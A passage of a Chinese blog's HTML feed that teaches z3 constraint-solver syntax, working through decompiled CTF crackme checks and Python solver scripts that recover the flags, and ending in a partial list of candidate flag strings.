class="number">65</span>)</span><br><span class="line">q(<span class="number">95</span>)</span><br><span class="line">q(<span class="number">97</span>+<span class="number">21</span>)</span><br><span class="line">q(<span class="number">10</span>+<span class="number">99</span>)</span><br><span class="line">q(<span class="number">9</span>+<span class="number">54</span>)</span><br><span class="line">q(<span class="number">125</span>)</span><br><span class="line"><span class="comment">#amateursCTF&#123;wh4t_d0_yoU_m34n_j4v4_isnt_A_vm?&#125;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 知识集 </category>
          
          <category> 逆向 </category>
          
          <category> 技能 </category>
          
          <category> 综合保护 </category>
          
          <category> VM </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 逆向 </tag>
            
            <tag> VM </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>z3基本语法</title>
      <link href="/posts/b4d67d75.html"/>
      <url>/posts/b4d67d75.html</url>
      
        <content type="html"><![CDATA[<p>z3是一个约束求解器，可以理解为解方程的工具，每一个约束都要写在x.add的语句中。</p><h2 id="声明变量">声明变量</h2><p>z3一共有三种变量</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a,b = Int(<span class="string">&#x27;a b&#x27;</span>)<span class="comment">#声明多个整数型变量</span></span><br><span class="line">a = Real(<span class="string">&#x27;a&#x27;</span>)<span class="comment">#声明单个实型变量</span></span><br><span class="line">a,b = Bitvec(<span class="string">&#x27;a b&#x27;</span>,<span class="number">8</span>)<span class="comment">#声明多个8位的向量型变量</span></span><br></pre></td></tr></table></figure><h2 id="使用例">使用例</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a,b = Int(<span class="string">&#x27;a b&#x27;</span>)</span><br><span class="line">solve(a+b == <span class="number">10</span>,a + <span class="number">3</span> * b ==<span class="number">12</span>)<span class="comment">#条件少时可以直接用solve不用add</span></span><br><span class="line"><span class="comment">#result : [b = 1,a = 9]</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">x=Int(<span class="string">&#x27;x&#x27;</span>)</span><br><span class="line">y=Int(<span class="string">&#x27;y&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span> (simplify(x + y + <span class="number">2</span>*x + <span class="number">3</span>))<span class="comment">#simplify用于打印化简后的表达式</span></span><br><span class="line"><span class="built_in">print</span> (simplify(x &lt; y + x + <span class="number">2</span>))</span><br><span class="line"><span class="built_in">print</span> (simplify(And(x + <span class="number">1</span> &gt;= <span class="number">3</span>, x**<span class="number">2</span> + x**<span class="number">2</span> + y**<span class="number">2</span> + <span class="number">2</span> &gt;= <span class="number">5</span>)))</span><br><span class="line"></span><br><span class="line"><span class="comment">#3 + 3*x + y</span></span><br><span class="line"><span class="comment">#Not(y &lt;= -2)</span></span><br><span class="line"><span class="comment">#And(x &gt;= 2, 2*x**2 + y**2 &gt;= 3)</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line">a,b = Ints(<span class="string">&#x27;a b&#x27;</span>)</span><br><span class="line"></span><br><span class="line">s=Solver()  <span class="comment">#创建一个解的对象s</span></span><br><span class="line">s.add(a + b == <span class="number">10</span>)<span class="comment">#添加约束条件</span></span><br><span class="line">s.add(a + <span class="number">3</span> * b == <span class="number">12</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> s.check() == sat: <span class="comment">#check() 检查解是否存在，存在会return &#x27;sat&#x27;</span></span><br><span class="line">result = s.model() <span class="comment">#输出</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(result)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(result[a])</span><br><span class="line"><span class="built_in">print</span>(result[b])</span><br></pre></td></tr></table></figure><h2 id="z3语法">z3语法</h2><p>对于普通的自定义逻辑（带位移，异或之类的不好逆向），z3可以秒杀</p><p>比如这么写：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> prism <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">cmp = [<span class="number">0x66</span>, <span class="number">0x4E</span>, <span class="number">0xA9</span>, <span class="number">0xFD</span>, <span class="number">0x3C</span>, <span class="number">0x55</span>, <span class="number">0x90</span>, <span class="number">0x24</span>, <span class="number">0x57</span>, <span class="number">0xF6</span>, <span class="number">0x5D</span>, <span class="number">0xB1</span>, <span class="number">0x01</span>, <span class="number">0x20</span>, <span class="number">0x81</span>, <span class="number">0xFD</span>, <span class="number">0x36</span>, <span class="number">0xA9</span>, <span class="number">0x1F</span>, <span class="number">0xA1</span>, <span class="number">0x0E</span>, <span class="number">0x0D</span>, <span class="number">0x80</span>, <span class="number">0x8F</span>, <span class="number">0xCE</span>, <span class="number">0x77</span>, <span class="number">0xE8</span>, <span class="number">0x23</span>, <span class="number">0x9E</span>, <span class="number">0x27</span>, <span class="number">0x60</span>, <span class="number">0x2F</span>, <span class="number">0xA5</span>, <span class="number">0xCF</span>, <span class="number">0x1B</span>, <span class="number">0xBD</span>, <span class="number">0x32</span>, <span class="number">0xDB</span>, <span class="number">0xFF</span>, <span class="number">0x28</span>, <span class="number">0xA4</span>, <span class="number">0x5D</span>]</span><br><span class="line">f = Solver()</span><br><span class="line"></span><br><span class="line">flag,out = pini(<span class="number">42</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">m = n = a = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i,j <span class="keyword">in</span> pl(<span class="number">7</span>,<span class="number">6</span>):</span><br><span class="line">    a = <span class="number">6</span> * i + j</span><br><span class="line">    m = flag[a]</span><br><span class="line">    n = flag[a]</span><br><span class="line">    m = ~m</span><br><span class="line">    m &amp;= i * (j + <span class="number">2</span>)</span><br><span class="line">    n = n &amp; ~(i * (j + <span class="number">2</span>)) | m</span><br><span class="line">    a = <span class="number">7</span> * j + i</span><br><span class="line">    out[a] = n</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">42</span>):</span><br><span class="line">    <span class="keyword">if</span> ( i % <span class="number">2</span> == <span class="number">1</span> ):</span><br><span class="line">        out[i] *= <span class="number">107</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        out[i] += out[i - <span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">42</span>):</span><br><span class="line">    f.add(cmp[i]==out[i])</span><br><span class="line">isflag(f,flag)</span><br><span class="line">pcheck(f,flag)</span><br></pre></td></tr></table></figure><p>但是可能遇到要对z3型数据判断的情况，比如下面这个题：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> v3; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">char</span> flag[<span class="number">64</span>]; <span class="comment">// [rsp+0h] [rbp-C0h] BYREF</span></span><br><span class="line">  <span class="type">char</span> out2[<span class="number">64</span>]; <span class="comment">// [rsp+40h] [rbp-80h] BYREF</span></span><br><span class="line">  __int64 check[<span class="number">4</span>]; <span class="comment">// [rsp+80h] [rbp-40h]</span></span><br><span class="line">  __int16 v8; <span class="comment">// [rsp+A0h] [rbp-20h]</span></span><br><span class="line">  <span class="type">int</span> len; <span class="comment">// [rsp+B0h] [rbp-10h]</span></span><br><span class="line">  <span class="type">int</span> v10; <span class="comment">// [rsp+B4h] [rbp-Ch]</span></span><br><span class="line">  <span class="type">int</span> v11; <span class="comment">// [rsp+B8h] [rbp-8h]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+BCh] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  check[<span class="number">0</span>] = <span class="number">0x10C0105000D07</span>LL;</span><br><span class="line">  check[<span class="number">1</span>] = <span class="number">0xF0509000F050D00</span>LL;</span><br><span class="line">  check[<span class="number">2</span>] = <span class="number">0x701030305020003</span>LL;</span><br><span class="line">  check[<span class="number">3</span>] = <span class="number">0xC02070201020B07</span>LL;</span><br><span class="line">  v8 = <span class="number">514</span>;</span><br><span class="line">  i = <span class="number">0</span>;</span><br><span class="line">  v11 = <span class="number">0</span>;</span><br><span class="line">  v10 = <span class="number">0</span>;</span><br><span class="line">  len = <span class="number">17</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Hi, PLZ input input&quot;</span>);</span><br><span class="line">  <span class="built_in">memset</span>(flag, <span class="number">0</span>, <span class="keyword">sizeof</span>(flag));</span><br><span class="line">  <span class="built_in">memset</span>(out2, <span class="number">0</span>, <span class="keyword">sizeof</span>(out2));</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%s&quot;</span>, flag);</span><br><span class="line">  v3 = <span class="built_in">strlen</span>(flag);</span><br><span class="line">  <span class="keyword">if</span> ( v3 == len )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">16</span>; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( (<span class="type">unsigned</span> __int8)flag[i] &gt; <span class="string">&#x27;`&#x27;</span> &amp;&amp; (<span class="type">unsigned</span> __int8)flag[i] &lt;= <span class="string">&#x27;z&#x27;</span> )</span><br><span class="line">        flag[i] = (flag[i] ^ <span class="number">0x47</span>) + <span class="number">1</span>;</span><br><span class="line">      <span class="keyword">if</span> ( (<span class="type">unsigned</span> __int8)flag[i] &gt; <span class="string">&#x27;@&#x27;</span> &amp;&amp; (<span class="type">unsigned</span> __int8)flag[i] &lt;= <span class="string">&#x27;Z&#x27;</span> )</span><br><span class="line">        flag[i] = (flag[i] ^ <span class="number">0x4B</span>) - <span class="number">1</span>;</span><br><span class="line">      out2[<span class="number">2</span> * i] = (<span class="type">unsigned</span> __int8)flag[i] &gt;&gt; <span class="number">4</span>;</span><br><span class="line">      out2[<span class="number">2</span> * i + <span class="number">1</span>] = flag[i] &amp; <span class="number">0xF</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; len; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( *((_BYTE *)check + <span class="number">2</span> * i) != out2[<span class="number">2</span> * (len - i) - <span class="number">2</span>]</span><br><span class="line">        &amp;&amp; *((_BYTE *)check + <span class="number">2</span> * i + <span class="number">1</span>) != out2[<span class="number">2</span> * (len - i) - <span class="number">2</span>] )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;wrong wrong wrong&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;woc,you got it,flag is your input&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;a Ha ? wrong1&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>主函数是这样的，这里它不止对flag进行分类讨论，还在讨论后进行计算：z3型可以直接进行计算，包括加和乘，对于位向量还可以左右移以及异或，但是都不能进行判断大小，如果要进行判断必须要在add中做判断，比如判断两个值是否相等：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">f.add(check[<span class="number">2</span> * i]==out3[<span class="number">2</span>*(<span class="built_in">len</span>-i-<span class="number">1</span>)])</span><br></pre></td></tr></table></figure><p>那么如果我们根据这道题写，还需要If函数（Z3自带）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">If(condition,a,b)</span><br></pre></td></tr></table></figure><p>意思是：如果条件成立，语句视为a，否则视为b</p><p>那么和add结合起来看就是：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">f.add(If(And(out[i] &gt; <span class="number">0x60</span>, out[i] &lt;= <span class="number">0x7a</span>), out2[i] == (out[i] ^ <span class="number">0x47</span>) + <span class="number">1</span>, <span class="literal">True</span>))</span><br><span class="line">f.add(If(And(out[i] &gt; <span class="number">0x40</span>, out[i] &lt;= <span class="number">0x5a</span>), out2[i] == (out[i] ^ <span class="number">0x4b</span>) - <span class="number">1</span>, <span class="literal">True</span>))</span><br></pre></td></tr></table></figure><p>如果条件成立，添加a约束，否则添加b约束，这里的b约束恒为真，表示如果条件不成立就跳过这个约束。可是问题来了，我们知道out[i]是由flag初始化的，也就是说out是z3位向量型，但是out2呢？如果把这里的out2视作一个普通列表，让out[i]计算后的值返回给out2，好像也没问题。但是！！这里的语句并不是赋值语句，而是判断语句，是一个<code>约束</code>，如果这里out2=34*[0],那么就是让out[i]运算后的值恒等于0的条件成立，显然这是无解的，也就是说，这里的两个变量都必须是位向量才可以，同时，不应该忘了如果两个条件均不成立，就要让out=out2</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">f.add(out2[i] == If(And(out[i] &gt; <span class="number">0x40</span>, out[i] &lt;= <span class="number">0x5a</span>), (out[i] ^ <span class="number">0x4b</span>) - <span class="number">1</span>,If(And(out[i] &gt; <span class="number">0x60</span>, out[i] &lt;= <span class="number">0x7a</span>), (out[i] ^ <span class="number">0x47</span>) + <span class="number">1</span>, out[i])))</span><br></pre></td></tr></table></figure><p>进行if的嵌套完成这个效果</p><p>之后还要对flag继续做变换变成最后的数组，且数组大小翻倍，如果后面的检查比较简单，可以直接在check==的时候写，但是由于这里的比较不是很直观，不如写出来变成单独的列表再比较，这时又要涉及到out2变成out3的问题了，由于这个是直接赋值，没有判断，所以方便起见，直接写赋值语句。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">out3[<span class="number">2</span>*i] = LShR(out2[i], <span class="number">4</span>)</span><br><span class="line">out3[<span class="number">2</span>*i+<span class="number">1</span>] = out2[i] &amp; <span class="number">0xf</span></span><br></pre></td></tr></table></figure><p>通过这两个例子可以发现，当想要赋值时，如果要对z3型变量进行判断/比较，就必须用add表达式，在其中，为了达成赋值效果，必须新建一个z3量才可以成功，但是如果是直接赋值，则直接对列表赋值即可。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> prism <span class="keyword">import</span> *</span><br><span class="line">check = [<span class="number">0x07</span>, <span class="number">0x0D</span>, <span class="number">0x00</span>, <span class="number">0x05</span>, <span class="number">0x01</span>, <span class="number">0x0C</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x0D</span>, <span class="number">0x05</span>, <span class="number">0x0F</span>, <span class="number">0x00</span>, <span class="number">0x09</span>, <span class="number">0x05</span>, <span class="number">0x0F</span>, <span class="number">0x03</span>, <span class="number">0x00</span>, <span class="number">0x02</span>, <span class="number">0x05</span>, <span class="number">0x03</span>, <span class="number">0x03</span>, <span class="number">0x01</span>, <span class="number">0x07</span>, <span class="number">0x07</span>, <span class="number">0x0B</span>, <span class="number">0x02</span>, <span class="number">0x01</span>, <span class="number">0x02</span>, <span class="number">0x07</span>, <span class="number">0x02</span>, <span class="number">0x0C</span>, <span class="number">0x02</span>, <span class="number">0x02</span>]</span><br><span class="line">flag,out = pini(<span class="number">17</span>)</span><br><span class="line">out2 = [BitVec(<span class="string">&#x27;out2[%2d]&#x27;</span> % i , <span class="number">8</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span> (<span class="number">34</span>)]</span><br><span class="line">out3 = [<span class="number">0</span>]*<span class="number">34</span></span><br><span class="line"><span class="built_in">len</span> = <span class="number">17</span></span><br><span class="line">f = Solver()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">17</span>):</span><br><span class="line"></span><br><span class="line">    f.add(out2[i] == If(And(out[i] &gt; <span class="number">0x40</span>, out[i] &lt;= <span class="number">0x5a</span>), (out[i] ^ <span class="number">0x4b</span>) - <span class="number">1</span>,</span><br><span class="line">                     If(And(out[i] &gt; <span class="number">0x60</span>, out[i] &lt;= <span class="number">0x7a</span>), (out[i] ^ <span class="number">0x47</span>) + <span class="number">1</span>, out[i])))</span><br><span class="line"></span><br><span class="line">    out3[<span class="number">2</span>*i] = LShR(out2[i], <span class="number">4</span>)</span><br><span class="line">    out3[<span class="number">2</span>*i+<span class="number">1</span>] = out2[i] &amp; <span class="number">0xf</span></span><br><span class="line">isflag(f,flag)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">17</span>):</span><br><span class="line">    f.add(check[<span class="number">2</span> * i]==out3[<span class="number">2</span>*(<span class="built_in">len</span>-i-<span class="number">1</span>)])</span><br><span class="line">    f.add(check[<span class="number">2</span> * i + <span class="number">1</span>]==out3[<span class="number">2</span>*(<span class="built_in">len</span>-i-<span class="number">1</span>)+<span class="number">1</span>])</span><br><span class="line">pcheck(f,flag)</span><br></pre></td></tr></table></figure><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml">&quot;la!</span><span class="template-variable">&#123;S3ch_A_EZVM&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">flag</span><span class="template-variable">&#123;Su%0_A_EZVM&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">fl&#x27;g</span><span class="template-variable">&#123;Su%0_A_EZVM&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">fl&#x27;g</span><span class="template-variable">&#123;Su%h_A_EZVM&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">&quot;l&#x27;g</span><span class="template-variable">&#123;Su%h_A_EZVM&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">&quot;l&#x27;!</span><span class="template-variable">&#123;Su%h_A_EZVM&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">&quot;l&#x27;!</span><span class="template-variable">&#123;Such_A_EZVM&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">&quot;,&#x27;!</span><span class="template-variable">&#123;Su%h_A_EZVM&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">&quot;,&#x27;!</span><span class="template-variable">&#123;S3%h_A_EZVM&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">&quot;,&#x27;!</span><span class="template-variable">&#123;S3ch_A_EZVM&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">f,&#x27;!</span><span class="template-variable">&#123;S3%h_A_EZVM&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">fl&#x27;!</span><span class="template-variable">&#123;S3%h_A_EZVM&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">fla!</span><span class="template-variable">&#123;S3%h_A_EZVM&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">&quot;la!</span><span class="template-variable">&#123;S3%h_A_EZVM&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">fla!</span><span class="template-variable">&#123;S3ch_A_EZVM&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">f,a!</span><span class="template-variable">&#123;S3ch_A_EZVM&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">f,a!</span><span class="template-variable">&#123;Such_A_EZVM&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">f,a!</span><span class="template-variable">&#123;Su%h_A_EZVM&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">&quot;,a!</span><span class="template-variable">&#123;Su%h_A_EZVM&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">&quot;la!</span><span class="template-variable">&#123;Su%h_A_EZVM&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">fl&#x27;!</span><span class="template-variable">&#123;Su%h_A_EZVM&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">f,&#x27;!</span><span class="template-variable">&#123;Su%h_A_EZVM&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">&quot;,&#x27;g</span><span class="template-variable">&#123;Su%h_A_EZVM&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">f,&#x27;g</span><span class="template-variable">&#123;Su%h_A_EZVM&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">&quot;,&#x27;g</span><span class="template-variable">&#123;S3%h_A_EZVM&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">f,&#x27;g</span><span class="template-variable">&#123;S3%h_A_EZVM&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">fl&#x27;g</span><span class="template-variable">&#123;S3%h_A_EZVM&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">&quot;l&#x27;g</span><span class="template-variable">&#123;S3%h_A_EZVM&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">&quot;l&#x27;!</span><span class="template-variable">&#123;S3%h_A_EZVM&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">flag</span><span class="template-variable">&#123;S3%h_A_EZVM&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">f,ag</span><span class="template-variable">&#123;S3%h_A_EZVM&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">flag</span><span class="template-variable">&#123;Su%h_A_EZVM&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">f,ag</span><span class="template-variable">&#123;Su%h_A_EZVM&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">fla!</span><span class="template-variable">&#123;Su%h_A_EZVM&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">f,a!</span><span class="template-variable">&#123;S3%h_A_EZVM&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">&quot;lag</span><span class="template-variable">&#123;Su%h_A_EZVM&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">&quot;lag</span><span class="template-variable">&#123;S3%h_A_EZVM&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">&quot;,ag</span><span class="template-variable">&#123;Su%h_A_EZVM&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">&quot;,a!</span><span class="template-variable">&#123;S3%h_A_EZVM&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">&quot;,ag</span><span class="template-variable">&#123;S3%h_A_EZVM&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">&quot;l&#x27;!</span><span class="template-variable">&#123;S3ch_A_EZVM&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">fl&#x27;!</span><span class="template-variable">&#123;S3ch_A_EZVM&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">f,&#x27;!</span><span class="template-variable">&#123;S3ch_A_EZVM&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">&quot;,a!</span><span class="template-variable">&#123;S3ch_A_EZVM&#125;</span><span class="language-xml"></span></span><br><span 